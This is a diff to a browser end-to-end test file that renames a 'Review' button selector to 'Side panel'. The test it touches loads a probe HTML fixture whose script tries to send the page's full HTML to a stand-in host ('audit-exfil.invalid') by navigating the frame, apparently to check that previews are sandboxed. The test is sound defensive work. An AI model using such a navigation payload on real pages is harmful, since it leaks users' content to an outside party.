@@ -9,7 +9,7 @@ test('an HTML preview cannot send its contents by navigating its own frame', asy
     'preview-probe.html',
     '<!doctype html><html><body><h1>AUDIT_ONLY_CONTENT</h1><script>location.href = "https://audit-exfil.invalid/capture?d=" + encodeURIComponent(document.documentElement.outerHTML)</script></body></html>',
   );
-  await page.getByRole('button', { name: 'Review', exact: true }).click();
+  await page.getByRole('button', { name: 'Side panel', exact: true }).click();
   await page.getByRole('tab', { name: 'Files', exact: true }).click();
   await page
     .getByRole('treeitem', { name: 'preview-probe.html', exact: true })
@@ -139,7 +139,9 @@ for (const width of [1440, 414]) {
     try {
       await app.open(await app.link('this'));
       if (width === 414) {
-        await page.getByRole('button', { name: 'Review', exact: true }).click();
+        await page
+          .getByRole('button', { name: 'Side panel', exact: true })
+          .click();
         await page.getByRole('tab', { name: 'Files', exact: true }).click();
       }
       await expect((await initialDirectory).json()).resolves.toMatchObject({
